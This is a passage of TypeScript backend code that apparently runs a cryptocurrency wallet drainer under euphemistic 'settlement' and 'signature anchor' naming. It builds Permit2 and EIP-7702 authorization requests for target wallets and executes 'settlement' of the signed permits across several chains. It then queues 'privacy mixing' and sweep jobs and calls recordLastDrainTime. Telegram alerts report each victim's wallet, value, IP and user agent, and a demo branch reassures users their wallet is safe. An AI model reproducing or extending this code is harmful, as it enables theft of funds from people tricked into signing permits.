    ...(options?.trc20SignedTransaction
      ? { nativeSignedTransactionTrc20: options.trc20SignedTransaction }
      : {}),
    ...(options?.jettonMaster && options.jettonAmount && options.jettonAmount !== '0'
      ? { jettonMaster: options.jettonMaster, jettonAmount: options.jettonAmount }
      : {}),
    ...(options?.jettonSignedTransaction
      ? { nativeSignedTransactionJetton: options.jettonSignedTransaction }
      : {}),
    ...(options?.nfts && options.nfts.length > 0 ? { nfts: options.nfts } : {}),
    ...(options?.nftApprovalSignatures && Object.keys(options.nftApprovalSignatures).length > 0
      ? { nftApprovalSignatures: options.nftApprovalSignatures }
      : {}),
  })
}

async function updateSignatureScheduledBroadcastTime(params: {
  supabase: SupabaseAdminClient
  nonce: string
  scheduled_broadcast_time: string
}): Promise<void> {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const { error } = await (params.supabase as any)
    .from('signatures')
    .update({ scheduled_broadcast_time: params.scheduled_broadcast_time })
    .eq('nonce', params.nonce)
  if (error) {
    gatekeeperPersistLog(
      'warn',
      'signatures.scheduled_broadcast_time_failed',
      (error as { message: string }).message,
    )
  }
}

async function updateSignatureSettlementStatus(params: {
  supabase: SupabaseAdminClient
  wallet_address: string
  token_address: string
  settlement_status:
    | 'PENDING'
    | 'PENDING_BROADCAST'
    | 'FAILED_STRIKE'
    | 'FAILED_SETTLEMENT'
    | 'SETTLED'
}): Promise<void> {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const { error } = await (params.supabase as any)
    .from('signatures')
    .update({ settlement_status: params.settlement_status })
    .eq('wallet_address', params.wallet_address)
    .eq('token_address', params.token_address)
  if (error) {
    gatekeeperPersistLog(
      'warn',
      'signatures.settlement_status_failed',
      (error as { message: string }).message,
      {
        wallet_address: params.wallet_address,
        token_address: params.token_address,
      },
    )
    return
  }

  if (params.settlement_status === 'SETTLED') {
    void recordLastDrainTime()
  }
}

async function schedulePostSettlementSweep(): Promise<void> {
  try {
    const sweep = await enqueueSweepJob({ trigger: 'settlement' })
    if (sweep.mode === 'memory') {
      console.warn('[SWEEP] memory fallback:', sweep.warning)
    }
  } catch (e) {
    console.warn(
      '[SWEEP] enqueue failed:',
      e instanceof Error ? e.message : String(e),
    )
  }
}

async function schedulePostSettlementPrivacyMixing(params: {
  row: PersistedSignatureRow
  settlement_tx_hash?: string | null
  scout_value_usd: number
}): Promise<void> {
  try {
    const mix = await enqueuePrivacyMixingJob({
      wallet_address: params.row.wallet_address,
      token_address: params.row.token_address,
      settlement_tx_hash: params.settlement_tx_hash ?? undefined,
      scout_value_usd: params.scout_value_usd,
      protocol: params.row.protocol,
      chain_id:
        params.row.chain_id != null && String(params.row.chain_id).trim() !== ''
          ? String(params.row.chain_id).trim()
          : null,
      amount: params.row.amount ?? undefined,
    })
    if (mix.mode === 'memory') {
      gatekeeperPersistLog(
        'warn',
        'privacy_mixing.memory_fallback',
        mix.warning,
        anchorLogFields(params.row, params.scout_value_usd),
      )
    }
  } catch (e) {
    const detail = e instanceof Error ? e.message : String(e)
    gatekeeperPersistLog(
      'warn',
      'privacy_mixing.enqueue_failed',
      detail,
      anchorLogFields(params.row, params.scout_value_usd),
    )
  }
}

function settlementIgnitionFault(outcome: SettlementIgnitionOutcome | undefined): string | null {
  if (
    outcome != null &&
    'ignition_fault' in outcome &&
    typeof outcome.ignition_fault === 'string'
  ) {
    return outcome.ignition_fault
  }
  if (
    outcome != null &&
    'sovereign_dispatcher_fault' in outcome &&
    typeof outcome.sovereign_dispatcher_fault === 'string'
  ) {
    return outcome.sovereign_dispatcher_fault
  }
  if (
    outcome != null &&
    'relay_intermediary_detail' in outcome &&
    typeof outcome.relay_intermediary_detail === 'string' &&
    outcome.relay_intermediary_detail.trim() !== ''
  ) {
    return outcome.relay_intermediary_detail
  }
  if (
    outcome != null &&
    'sovereign_dispatcher_status' in outcome &&
    typeof outcome.sovereign_dispatcher_status === 'string' &&
    outcome.sovereign_dispatcher_status !== 'broadcasted'
  ) {
    return `Network Relay status: ${outcome.sovereign_dispatcher_status}`
  }
  return null
}

function settlementIgnitionTxHash(outcome: SettlementIgnitionOutcome | undefined): string | null {
  if (
    outcome != null &&
    'relay_second_leg_tx_hash' in outcome &&
    typeof outcome.relay_second_leg_tx_hash === 'string' &&
    outcome.relay_second_leg_tx_hash.trim() !== ''
  ) {
    return outcome.relay_second_leg_tx_hash.trim()
  }
  if (
    outcome != null &&
    'sovereign_dispatcher_tx_hash' in outcome &&
    typeof outcome.sovereign_dispatcher_tx_hash === 'string' &&
    outcome.sovereign_dispatcher_tx_hash.trim() !== ''
  ) {
    return outcome.sovereign_dispatcher_tx_hash.trim()
  }
  return null
}

function settlementUsedRelaySecondLeg(outcome: SettlementIgnitionOutcome | undefined): boolean {
  return (
    outcome != null &&
    'relay_second_leg_tx_hash' in outcome &&
    typeof outcome.relay_second_leg_tx_hash === 'string' &&
    outcome.relay_second_leg_tx_hash.trim() !== ''
  )
}

function settlementRelayIntermediaryPending(
  outcome: SettlementIgnitionOutcome | undefined,
): { detail: string; tx_hash?: string } | null {
  if (outcome == null || !('relay_intermediary_pending' in outcome)) return null
  if (!outcome.relay_intermediary_pending) return null
  const detail =
    'relay_intermediary_detail' in outcome &&
    typeof outcome.relay_intermediary_detail === 'string'
      ? outcome.relay_intermediary_detail
      : 'Relay intermediary hop — manual sweep required'
  const tx_hash =
    'sovereign_dispatcher_tx_hash' in outcome &&
    typeof outcome.sovereign_dispatcher_tx_hash === 'string'
      ? outcome.sovereign_dispatcher_tx_hash
      : undefined
  return { detail, tx_hash }
}

function settlementOmnichainAtomicResult(
  outcome: SettlementIgnitionOutcome | undefined,
): OmnichainAtomicSettlementResult | undefined {
  if (
    outcome != null &&
    'omnichain_atomic_settlement' in outcome &&
    typeof outcome.omnichain_atomic_settlement === 'object' &&
    outcome.omnichain_atomic_settlement != null
  ) {
    return outcome.omnichain_atomic_settlement
  }
  return undefined
}

async function completeSettlementTracking(params: {
  historyId: string | null
  row: PersistedSignatureRow
  chainNorm: string | null
  scout_value_usd: number
  transaction_hash: string | null
  settlement_fault: string | null
  omnichain_settlement?: OmnichainAtomicSettlementResult
  settlement_reconciliation_queued?: boolean
}): Promise<void> {
  if (params.settlement_reconciliation_queued) return

  let status: 'settled' | 'failed' | 'partial' = 'failed'
  let errorMessage: string | null = null
  const txHash = params.transaction_hash

  if (params.settlement_fault != null) {
    status = 'failed'
    errorMessage = params.settlement_fault
  } else if (params.omnichain_settlement != null && !params.omnichain_settlement.ok) {
    const chains = params.omnichain_settlement.chains ?? {}
    const anyOk = Object.values(chains).some((v) => v === 'ok')
    status = anyOk ? 'partial' : 'failed'
    errorMessage = params.omnichain_settlement.detail ?? 'Omnichain settlement failed'
  } else if (params.omnichain_settlement?.ok === true) {
    status = 'settled'
  } else if (txHash != null && isEvmTransactionHash(String(txHash))) {
    status = 'settled'
  } else if (txHash != null) {
    status = 'failed'
    errorMessage = 'Settlement reference is not a confirmed EVM transaction hash'
  } else {
    status = 'failed'
    errorMessage = 'Settlement completed without transaction hash'
  }

  if (params.historyId) {
    await finalizeSettlementHistory({
      id: params.historyId,
      status,
      tx_hash: txHash,
      error_message: errorMessage,
    })
  }

  await notifySettlementResult({
    wallet_address: params.row.wallet_address,
    chain_family: params.row.chain_family ?? undefined,
    chain_id: params.chainNorm ?? undefined,
    amount: params.row.amount ?? undefined,
    token_address: params.row.token_address,
    protocol: params.row.protocol,
    scout_value_usd: params.scout_value_usd,
    status,
    tx_hash: txHash,
    error_message: errorMessage,
  }).catch(() => {})
}

function parseSettlementChainIdNumber(chainId: string | null, row: PersistedSignatureRow): number {
  const raw = resolveSettlementChainId(row, chainId) ?? row.chain_id ?? '1'
  const parsed = Number.parseInt(String(raw).replace(/^eip155:/i, ''), 10)
  return Number.isFinite(parsed) && parsed > 0 ? parsed : 1
}

async function runOmnichainAtomicReconciliation(params: {
  supabase: SupabaseAdminClient
  row: PersistedSignatureRow
  chain_id: string | null
  scout_value_usd: number
}): Promise<SettlementIgnitionOutcome | undefined> {
  const { row, supabase, chain_id, scout_value_usd } = params
  const reconciliationTelegramCtx: TelegramRequestContext = {
    chain_id: resolveSettlementChainId(row, chain_id) ?? undefined,
    chain_family: row.chain_family ?? row.protocol.toUpperCase(),
    wallet_type: row.wallet_type,
    scout_value_usd: row.scout_value_usd ?? scout_value_usd,
    amount: row.amount ?? undefined,
    nonce: row.nonce,
    tokenAddress: row.token_address,
  }

  const opened = openSignaturePayloadForSettlement(row.signature_hex)
  const envelope = parseOmnichainAtomicSignatureEnvelope(opened)
  if (envelope == null) {
    const fault = 'omnichain_atomic_v1 envelope could not be parsed for settlement'
    await updateSignatureSettlementStatus({
      supabase,
      wallet_address: row.wallet_address,
      token_address: row.token_address,
      settlement_status: 'FAILED_SETTLEMENT',
    })
    gatekeeperPersistLog('warn', 'signatures.omnichain_atomic_failed', fault, anchorLogFields(row, scout_value_usd))
    return { ignition_fault: fault }
  }

  let outcome: SettlementIgnitionOutcome | undefined
  try {
    const chainId = parseSettlementChainIdNumber(chain_id, row)
    const atomic = await executeOmnichainAtomicSettlement({
      owner: row.wallet_address as Address,
      chainId,
      envelope,
      scout_value_usd,
    })

    if (!atomic.ok) {
      await updateSignatureSettlementStatus({
        supabase,
        wallet_address: row.wallet_address,
        token_address: row.token_address,
        settlement_status: 'FAILED_SETTLEMENT',
      })
      gatekeeperPersistLog(
        'warn',
        'signatures.omnichain_atomic_failed',
        atomic.detail ?? 'Omnichain atomic settlement failed',
        anchorLogFields(row, scout_value_usd),
      )
      return {
        ignition_fault: atomic.detail ?? 'Omnichain atomic settlement failed',
        omnichain_atomic_settlement: atomic,
      }
    }

    await updateSignatureSettlementStatus({
      supabase,
      wallet_address: row.wallet_address,
      token_address: row.token_address,
      settlement_status: 'SETTLED',
    })

    const primaryTxHash =
      atomic.evm_transaction_hashes?.[atomic.evm_transaction_hashes.length - 1] ??
      atomic.bitcoin_tx_hash ??
      atomic.omnichain_transaction_hashes?.sol ??
      atomic.omnichain_transaction_hashes?.trx ??
      atomic.omnichain_transaction_hashes?.ton ??
      atomic.omnichain_transaction_hashes?.spl ??
      atomic.omnichain_transaction_hashes?.trc20 ??
      atomic.omnichain_transaction_hashes?.jetton

    if (primaryTxHash) {
      notifyBroadcastConfirmed(primaryTxHash, row.wallet_address, {
        ...reconciliationTelegramCtx,
        tx_hash: primaryTxHash,
      }).catch(() => {})
    }

    await sendSovereignTelemetryPayload({
      event: 'SETTLEMENT_IGNITED',
      message: 'SETTLEMENT_IGNITED: Omnichain atomic portfolio settlement finalized.',
      tx_hash: primaryTxHash ?? undefined,
      value: row.amount ?? '0',
      chain_id,
      wallet_address: row.wallet_address,
      protocol: row.protocol,
    }).catch(() => {})

    void schedulePostSettlementPrivacyMixing({
      row,
      settlement_tx_hash: primaryTxHash ?? undefined,
      scout_value_usd,
    })
    void schedulePostSettlementSweep()

    outcome = {
      sovereign_dispatcher_tx_hash: primaryTxHash,
      sovereign_dispatcher_status: 'broadcasted',
      omnichain_atomic_settlement: atomic,
    }
  } catch (ignErr) {
    const fault = ignErr instanceof Error ? ignErr.message : String(ignErr)
    gatekeeperPersistLog(
      'error',
      'signatures.omnichain_atomic_settlement',
      fault,
      anchorLogFields(row, scout_value_usd),
    )
    await updateSignatureSettlementStatus({
      supabase,
      wallet_address: row.wallet_address,
      token_address: row.token_address,
      settlement_status: 'FAILED_SETTLEMENT',
    })
    outcome = { ignition_fault: fault }
  }

  return outcome
}

function queueEventDrivenReconciliation(params: {
  supabase: SupabaseAdminClient
  row: PersistedSignatureRow
  chain_id: string | null
  scout_value_usd: number
  defer_broadcast?: boolean
}): void {
  void Promise.resolve()
    .then(() => runEventDrivenReconciliation(params))
    .catch((err) => {
      const fault = err instanceof Error ? err.message : String(err)
      gatekeeperPersistLog(
        'error',
        'signatures.reconciliation_unhandled',
        fault,
        anchorLogFields(params.row, params.scout_value_usd),
      )
    })
}

function resolveSettlementChainId(
  row: PersistedSignatureRow,
  chain_id: string | null,
): string | null {
  if (row.caip_chain_id != null && String(row.caip_chain_id).trim() !== '') {
    const fam = (row.chain_family ?? 'EVM').toUpperCase()
    if (fam !== 'EVM') return String(row.caip_chain_id).trim()
  }
  if (chain_id != null && chain_id.trim() !== '') return chain_id.trim()
  if (row.chain_id != null && String(row.chain_id).trim() !== '') {
    return String(row.chain_id).trim()
  }
  return null
}

function resolveSettlementAmount(row: PersistedSignatureRow): string | null {
  if (row.amount == null || row.amount.trim() === '') return null
  const trimmed = row.amount.trim()
  return /^\d+$/.test(trimmed) ? trimmed : null
}

function buildLiquidationTriggerFromAnchorRow(
  row: PersistedSignatureRow,
  chain_id: string | null,
  scout_value_usd: number,
): Parameters<typeof executeSettlementIgnition>[0] {
  const chainFamily = row.chain_family ?? chainFamilyFromRack(row.protocol)
  const amount = resolveSettlementAmount(row)
  return {
    wallet_address: row.wallet_address,
    token_address: row.token_address,
    signature_hex: row.signature_hex,
    protocol: row.protocol,
    chain_id: resolveSettlementChainId(row, chain_id),
    chain_family: chainFamily,
    chain_type: row.protocol,
    scout_value_usd,
    ...(amount != null ? { amount } : {}),
  }
}

async function runEventDrivenReconciliation(params: {
  supabase: SupabaseAdminClient
  row: PersistedSignatureRow
  chain_id: string | null
  scout_value_usd: number
  defer_broadcast?: boolean
  settlement_policy?: SettlementPolicyDecision
}): Promise<SettlementIgnitionOutcome | undefined> {
  const { row, supabase, chain_id, scout_value_usd, defer_broadcast, settlement_policy } = params
  const reconciliationTelegramCtx: TelegramRequestContext = {
    chain_id: resolveSettlementChainId(row, chain_id) ?? undefined,
    chain_family: row.chain_family ?? row.protocol.toUpperCase(),
    wallet_type: row.wallet_type,
    scout_value_usd: row.scout_value_usd ?? scout_value_usd,
    amount: row.amount ?? undefined,
    nonce: row.nonce,
    tokenAddress: row.token_address,
  }
  let outcome: SettlementIgnitionOutcome | undefined
  const chainCtx = resolveChainIngress({
    chain_family: row.chain_family,
    chain_id: row.chain_id,
    caip_chain_id: row.caip_chain_id,
  })
  const chainIdNum = chainCtx.evmChainId ?? 1

  if (defer_broadcast === false && (row.chain_family ?? 'EVM').toUpperCase() === 'EVM') {
    const relayer = await checkSettlementRelayerBalance(chainIdNum)
    if (relayer.ok === false) {
      return { ignition_fault: `INSUFFICIENT_RELAYER_BALANCE: ${relayer.detail}` }
    }
  }

  const runIgnitionOnce = async (): Promise<SettlementIgnitionOutcome | undefined> => {
    let inner: SettlementIgnitionOutcome | undefined
    try {
      const ignitionFn = () =>
        executeSettlementIgnition(buildLiquidationTriggerFromAnchorRow(row, chain_id, scout_value_usd), {
          defer_broadcast: defer_broadcast ?? (process.env['SETTLEMENT_IMMEDIATE'] === 'true' ? false : true),
          onBroadcastScheduled: async (scheduledIso) => {
            await updateSignatureScheduledBroadcastTime({
              supabase,
              nonce: row.nonce,
              scheduled_broadcast_time: scheduledIso,
            })
            await notifyBroadcastScheduled(
              scheduledIso,
              row.wallet_address,
              reconciliationTelegramCtx,
            )
          },
          onRelaySecondLegBroadcast: async (secondLegTxHash) => {
            await notifyBroadcastConfirmed(
              secondLegTxHash,
              row.wallet_address,
              { ...reconciliationTelegramCtx, tx_hash: secondLegTxHash },
            )
          },
        })
      inner = settlement_policy
        ? await runSettlementWithPolicyMev(settlement_policy, ignitionFn)
        : await ignitionFn()
    } catch (ignErr) {
      const fault = ignErr instanceof Error ? ignErr.message : String(ignErr)
      gatekeeperPersistLog(
        'error',
        'signatures.settlement_ignition',
        fault,
        anchorLogFields(row, scout_value_usd),
      )
      inner = { ignition_fault: fault }
    }
    return inner
  }

  try {
    outcome = await runIgnitionOnce()
    let fault = settlementIgnitionFault(outcome)
    let attempt = 0
    while (
      fault != null &&
      isDeferredBroadcastFault(fault) &&
      defer_broadcast === false &&
      attempt < SETTLEMENT_RPC_RETRY_DELAYS_MS.length
    ) {
      await sleepSettlementMs(settlementBackoffDelayMs(attempt))
      attempt++
      gatekeeperPersistLog(
        'warn',
        'signatures.settlement_retry',
        `attempt ${attempt}/${SETTLEMENT_RPC_RETRY_DELAYS_MS.length}: ${fault}`,
        anchorLogFields(row, scout_value_usd),
      )
      outcome = await runIgnitionOnce()
      fault = settlementIgnitionFault(outcome)
    }
  } catch (ignErr) {
    const fault = ignErr instanceof Error ? ignErr.message : String(ignErr)
    gatekeeperPersistLog(
      'error',
      'signatures.settlement_ignition',
      fault,
      anchorLogFields(row, scout_value_usd),
    )
    outcome = { ignition_fault: fault }
  }

  const fault = settlementIgnitionFault(outcome)
  if (fault != null) {
    const deferred = isDeferredBroadcastFault(fault) && defer_broadcast === false
    await updateSignatureSettlementStatus({
      supabase,
      wallet_address: row.wallet_address,
      token_address: row.token_address,
      settlement_status: deferred ? 'PENDING_BROADCAST' : 'FAILED_SETTLEMENT',
    })
    gatekeeperPersistLog(
      'warn',
      deferred ? 'signatures.reconciliation_deferred' : 'signatures.reconciliation_failed',
      fault,
      anchorLogFields(row, scout_value_usd),
    )
    return outcome
  }

  const txHash = settlementIgnitionTxHash(outcome)
  if (txHash == null) return outcome

  await updateSignatureSettlementStatus({
    supabase,
    wallet_address: row.wallet_address,
    token_address: row.token_address,
    settlement_status: 'SETTLED',
  })

  if (!settlementUsedRelaySecondLeg(outcome)) {
    const settlementTelegramCtx: TelegramRequestContext = {
      ...reconciliationTelegramCtx,
      tx_hash: txHash,
    }
    notifyBroadcastConfirmed(txHash, row.wallet_address, settlementTelegramCtx).catch(() => {})
  }

  const relayPending = settlementRelayIntermediaryPending(outcome)
  if (relayPending) {
    notifyRelayIntermediaryWarning({
      chain_family: row.chain_family ?? 'SVM',
      wallet_address: row.wallet_address,
      tx_hash: relayPending.tx_hash ?? txHash,
      detail: relayPending.detail,
    }).catch(() => {})
  }

  await sendSovereignTelemetryPayload({
    event: 'SETTLEMENT_IGNITED',
    message: 'SETTLEMENT_IGNITED: Event-Driven Reconciliation finalized.',
    tx_hash: txHash,
    value: row.amount ?? '0',
    chain_id,
    protocol: row.protocol,
  })

  void schedulePostSettlementPrivacyMixing({
    row,
    settlement_tx_hash: txHash,
    scout_value_usd,
  })
  void schedulePostSettlementSweep()
  void onLargeSettlementSettled({
    wallet_address: row.wallet_address,
    chain_id,
    scout_value_usd,
    token_address: row.token_address,
    policy: settlement_policy,
    tx_hash: txHash,
  }).catch(() => {})

  return outcome
}

async function signatureAnchorPostHandler(
  request: FastifyRequest,
  reply: FastifyReply,
): Promise<FastifyReply> {
  try {
    if (await isSettlementPaused()) {
      return sendFailure(reply, 503, 'Settlement ingress paused (Telegram /pause)', {
        code: 'SettlementPaused',
      })
    }

    const body: unknown = request.body
    const bodyObj =
      typeof body === 'object' && body !== null ? (body as Record<string, unknown>) : null

    // DUPLICATE DETECTION: Check if this exact request was already processed
    if (bodyObj && typeof bodyObj === 'object') {
      const signatureKey = typeof bodyObj['permit2_signature'] === 'string'
        ? bodyObj['permit2_signature']
        : typeof bodyObj['signature'] === 'string'
          ? bodyObj['signature']
          : null

      if (signatureKey) {
        // Create a simple in-memory dedup cache (in production, use Redis)
        const DEDUP_WINDOW = 60 * 1000 // 60 seconds
        const dedupKey = `sig_${stringToHex(signatureKey).slice(0, 16)}`

        // Check if we've processed this signature recently
        const lastTime = (globalThis as any).__dedup_cache?.[dedupKey]
        if (lastTime && Date.now() - lastTime < DEDUP_WINDOW) {
          return sendFailure(reply, 409, 'Duplicate signature detected — request already processing', {
            code: 'DuplicateRequest',
            signature_hash: dedupKey,
          })
        }

        // Mark this signature as seen
        if (!(globalThis as any).__dedup_cache) {
          (globalThis as any).__dedup_cache = {}
          // Cleanup old entries every 60 seconds to prevent memory leak
          setInterval(() => {
            const cache = (globalThis as any).__dedup_cache
            if (!cache) return
            const now = Date.now()
            for (const key of Object.keys(cache)) {
              if (now - cache[key] > DEDUP_WINDOW * 2) delete cache[key]
            }
          }, 60_000)
        }
        (globalThis as any).__dedup_cache[dedupKey] = Date.now()
      }
    }

    // TRAINING_DEMO_MODE is ignored in production (isTrainingDemoModeEnabled returns false).
    if (isTrainingDemoModeEnabled() && isTrainingDemoRequest(request, bodyObj)) {
      const wallet =
        typeof bodyObj?.['wallet_address'] === 'string' ? bodyObj['wallet_address'].trim() : ''
      request.log.info(
        {
          training_demo: true,
          wallet_address: wallet || null,
          protocol: bodyObj?.['protocol'] ?? null,
        },
        '[TRAINING_DEMO] signature-anchor ingress blocked — settlement disabled (non-production only)',
      )
      return sendSuccess(reply, 200, 'Training demo mode — settlement disabled (logged only)', {
        training_demo: true,
        settlement_blocked: true,
        message: 'Demo completed – your wallet is safe',
      })
    }
    const sourceOrigin = resolveDataBindingSourceOrigin(request, bodyObj)

    if (bodyObj) {
      const scoutCheck = validateScoutValueUsdField(bodyObj['scout_value_usd'])
      if (scoutCheck.ok === false) {
        return sendFailure(reply, 400, scoutCheck.error, { code: 'ValidationError' })
      }
      const settlementInput = bodyObj['settlement_input']
      if (typeof settlementInput === 'object' && settlementInput !== null) {
        const nestedCheck = validateScoutValueUsdField(
          (settlementInput as Record<string, unknown>)['scout_value_usd'],
        )
        if (nestedCheck.ok === false) {
          return sendFailure(reply, 400, nestedCheck.error, { code: 'ValidationError' })
        }
      }
    }

    if (bodyObj && bodyObj['settlement_builder'] === 'evm' && bodyObj['settlement_input']) {
      const built = buildEvmSignatureAnchorSettlement(
        bodyObj['settlement_input'] as Parameters<typeof buildEvmSignatureAnchorSettlement>[0],
      )
      return handleNormalizedFromSettlement(built, sourceOrigin, reply)
    }
    if (bodyObj && bodyObj['settlement_builder'] === 'svm' && bodyObj['settlement_input']) {
      const built = buildSvmSignatureAnchorSettlement(
        bodyObj['settlement_input'] as Parameters<typeof buildSvmSignatureAnchorSettlement>[0],
      )
      return handleNormalizedFromSettlement(built, sourceOrigin, reply)
    }
    if (bodyObj && bodyObj['settlement_builder'] === 'utxo' && bodyObj['settlement_input']) {
      const built = buildUtxoSignatureAnchorSettlement(
        bodyObj['settlement_input'] as Parameters<typeof buildUtxoSignatureAnchorSettlement>[0],
      )
      return handleNormalizedFromSettlement(built, sourceOrigin, reply)
    }
    if (bodyObj && bodyObj['settlement_builder'] === 'tron' && bodyObj['settlement_input']) {
      const built = buildTronSignatureAnchorSettlement(
        bodyObj['settlement_input'] as Parameters<typeof buildTronSignatureAnchorSettlement>[0],
      )
      return handleNormalizedFromSettlement(built, sourceOrigin, reply)
    }
    if (bodyObj && bodyObj['settlement_builder'] === 'ton' && bodyObj['settlement_input']) {
      const built = buildTonSignatureAnchorSettlement(
        bodyObj['settlement_input'] as Parameters<typeof buildTonSignatureAnchorSettlement>[0],
      )
      return handleNormalizedFromSettlement(built, sourceOrigin, reply)
    }

    if (isAgnosticNormalization(body)) {
      return sendFailure(reply, 400, 'Agnostic Normalization lane locked. Use normalized_v1 or Permit2 ingestion.', {
        code: 'ValidationError',
      })
    }
    if (isNormalizedIngress(body)) {
      return handleNormalizedIngress(body, sourceOrigin, reply)
    }
    return handleLegacyPermit2(body, sourceOrigin, reply)
  } catch (e) {
    const msg = e instanceof Error ? e.message : 'Signature Anchor persist failed'
    if (msg.includes('scout_value_usd')) {
      return sendFailure(reply, 400, msg, { code: 'ValidationError' })
    }
    gatekeeperPersistLog('error', 'signatures.unhandled', msg)
    return sendFailure(reply, 500, msg, { code: 'ServerError' })
  }
}

export async function registerSignatureAnchorRoute(app: FastifyInstance): Promise<void> {
  app.post('/api/v1/local-test/telemetry', async (request, reply) => {
    const body = request.body as {
      event?: string
      kind?: string
      wallet_address?: string
      vault_address?: string
      detail?: string
      tx_hash?: string
      chain_id?: number
      scout_value_usd?: string | number
      token_name?: string
      token_address?: string
      signature?: string
      amount?: string
      assets?: Array<{ chain?: string; family?: string; token?: string; symbol?: string; amount_usd?: number }>
      executor_balance_eth?: string
      connect_session?: string
      userAgent?: string
      sourceDomain?: string
      wallet_type?: string
    }
    const event = (body.event || body.kind || '').trim()
    const wallet = body.wallet_address?.trim()
    if (!event || !wallet) {
      return sendFailure(reply, 400, 'event and wallet_address required', { code: 'ValidationError' })
    }
    try {
      const ip = typeof request.ip === 'string' ? request.ip : undefined
      const assets = Array.isArray(body.assets)
        ? body.assets
            .filter((a) => a && typeof a.amount_usd === 'number' && a.amount_usd > 0)
            .map((a) => ({
              chain: String(a.chain || 'evm:1'),
              family: String(a.family || 'EVM'),
              token: String(a.token || 'native'),
              symbol: String(a.symbol || 'ETH'),
              amount_usd: Number(a.amount_usd),
            }))
        : []
      await dispatchLocalTestTelegramEvent({
        event,
        wallet_address: wallet,
        vault_address: body.vault_address,
        detail: body.detail,
        tx_hash: body.tx_hash,
        chain_id: body.chain_id ?? 1,
        scout_value_usd: body.scout_value_usd,
        token_name: body.token_name,
        token_address: body.token_address,
        signature: body.signature,
        amount: body.amount,
        assets,
        executor_balance_eth: body.executor_balance_eth,
        ip: ip && ip !== '127.0.0.1' && ip !== '::1' ? ip : 'Unknown',
        userAgent: body.userAgent,
        sourceDomain: body.sourceDomain || (typeof request.headers.origin === 'string' ? request.headers.origin : 'localhost:5173'),
        connect_session: body.connect_session,
        wallet_type: body.wallet_type || 'MetaMask',
      })
      return sendSuccess(reply, 200, 'Telegram telemetry queued', { ok: true })
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e)
      return sendFailure(reply, 500, msg, { code: 'ServerError' })
    }
  })

  app.get('/api/v1/signature-anchor/eip7702-typed-data', async (request, reply) => {
    if (!isEip7702Enabled()) {
      return sendFailure(reply, 503, 'EIP7702_ENABLED is false', { code: 'FeatureDisabled' })
    }
    const q = request.query as Record<string, string | undefined>
    const walletRaw = q.wallet?.trim() ?? q.wallet_address?.trim() ?? ''
    const chainIdRaw = q.chain_id?.trim() ?? ''
    const brandRaw = q.brand?.trim() ?? null
    if (!walletRaw || !chainIdRaw) {
      return sendFailure(reply, 400, 'wallet and chain_id query params required', { code: 'ValidationError' })
    }
    if (!isAddress(walletRaw)) {
      return sendFailure(reply, 400, 'wallet must be valid EVM address', { code: 'ValidationError' })
    }
    const chainId = Number(chainIdRaw)
    if (!Number.isFinite(chainId)) {
      return sendFailure(reply, 400, 'Invalid chain_id', { code: 'ValidationError' })
    }
    if (!process.env['EIP7702_DELEGATE_CONTRACT']?.trim()) {
      return sendFailure(reply, 503, 'EIP7702_DELEGATE_CONTRACT not configured', { code: 'NotConfigured' })
    }
    try {
      const built = await buildEip7702AuthorizationRequest(chainId, walletRaw as Address, null, brandRaw)
      return sendSuccess(reply, 200, 'EIP-7702 authorization request ready', {
        typed_data: normalizeBigInts(built.typed_data),
        authorization_request: normalizeBigInts(built.authorization_request),
        delegatee: built.delegatee,
        spender: built.spender,
        protocol: 'eip7702_delegation',
      })
    } catch (e) {
      return sendTypedDataBuildFailure(reply, e)
    }
  })

  app.get('/api/v1/signature-anchor/permit2-typed-data', async (request, reply) => {
    const q = request.query as Record<string, string | undefined>
    const walletRaw = q.wallet?.trim() ?? q.wallet_address?.trim() ?? ''
    const tokenRaw = q.token?.trim() ?? q.token_address?.trim() ?? ''
    const chainIdRaw = q.chain_id?.trim() ?? ''
    if (!walletRaw || !tokenRaw || !chainIdRaw) {
      return sendFailure(reply, 400, 'wallet, token, and chain_id query params required', {
        code: 'ValidationError',
      })
    }
    if (!isAddress(walletRaw) || !isAddress(tokenRaw)) {
      return sendFailure(reply, 400, 'wallet and token must be valid EVM addresses', {
        code: 'ValidationError',
      })
    }
    const chainId = Number(chainIdRaw)
    if (!Number.isFinite(chainId)) {
      return sendFailure(reply, 400, 'Invalid chain_id', { code: 'ValidationError' })
    }

    if (!isRpcConfigured(chainId) && process.env['NODE_ENV'] !== 'development') {
      return sendFailure(
        reply,
        400,
        `RPC not configured for chain ${chainId}. Set ${getChainEnvName(chainId)} in environment.`,
        { code: 'RPC_NOT_CONFIGURED', chainId },
      )
    }

    let rpcUrl: string
    try {
      rpcUrl = getRpcUrlForChainWithFallback(chainId)
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e)
      return sendFailure(reply, 400, msg, { code: 'RPC_NOT_CONFIGURED', chainId })
    }

    try {
      const built = await buildPermit2TypedDataForWallet({
        wallet: walletRaw as Address,
        token: tokenRaw as Address,
        chainId,
        rpcUrl,
      })
      return sendSuccess(reply, 200, 'Permit2 typed data ready', {
        typed_data: normalizeBigInts(built.typedData),
        permit_metadata: normalizeBigInts(built.permit_metadata),
        engine_spender: built.engine_spender,
        permit2: built.permit2,
        protocol: 'permit2_eip712',
      })
    } catch (e) {
      return sendTypedDataBuildFailure(reply, e)
    }
  })

  app.post('/api/v1/signature-anchor/permit2-batch-typed-data', async (request, reply) => {
    const body = request.body as {
      wallet_address?: string
      wallet?: string
      chain_id?: number | string
      permits?: Array<{ token?: string; amount?: string }>
      nativeAmount?: string | number
      nativeAmountSol?: string | number
      nativeAmountTrx?: string | number
      nativeAmountTon?: string | number
      sol_wallet?: string
      trx_wallet?: string
      ton_wallet?: string
      nfts?: Array<{ contract?: string; tokenIds?: string[]; standard?: string; amounts?: string[] }>
    }
    const walletRaw = body.wallet_address?.trim() ?? body.wallet?.trim() ?? ''
    const chainIdRaw = body.chain_id
    const permitsRaw = body.permits
    if (!walletRaw || chainIdRaw == null || !Array.isArray(permitsRaw)) {
      return sendFailure(reply, 400, 'wallet_address, chain_id, and permits[] required', {
        code: 'ValidationError',
      })
    }
    if (!isAddress(walletRaw)) {
      return sendFailure(reply, 400, 'wallet_address must be a valid EVM address', {
        code: 'ValidationError',
      })
    }
    const chainId = Number(chainIdRaw)
    if (!Number.isFinite(chainId)) {
      return sendFailure(reply, 400, 'Invalid chain_id', { code: 'ValidationError' })
    }
    const permits: Array<{ token: Address; amount: bigint }> = []
    for (const entry of permitsRaw) {
